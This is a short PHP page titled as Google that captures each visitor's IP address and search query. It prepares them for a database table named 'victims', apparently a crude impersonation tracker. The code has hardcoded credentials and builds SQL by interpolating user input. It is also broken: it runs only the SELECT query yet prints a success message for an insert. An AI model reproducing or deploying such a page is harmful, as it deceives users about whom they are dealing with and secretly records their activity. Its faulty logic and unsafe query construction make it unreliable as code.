<!doctype html>
<html>
<title>This is google yes</title>

<?php
//header('location: https://google.com');
$ipadd = htmlspecialchars($_SERVER['REMOTE_ADDR']);
$search = htmlspecialchars($_GET['q']);

$svrnm = "localhost";
$usr =  "goog";
$pass = "Password01";
$dbn = "g00gie";

    $conn = mysqli_connect($svrnm, $usr, $pass, $dbn);
    
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    $sql = "SELECT ipaddr, search from victims;";
    $sql_ins = "INSERT INTO victims (ipaddr,search) 
        values ('{$ipadd}','{$search}')";
    //error test
    if (mysqli_query($conn, $sql)) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . mysqli_error($conn);
    }

mysqli_close($conn);
?>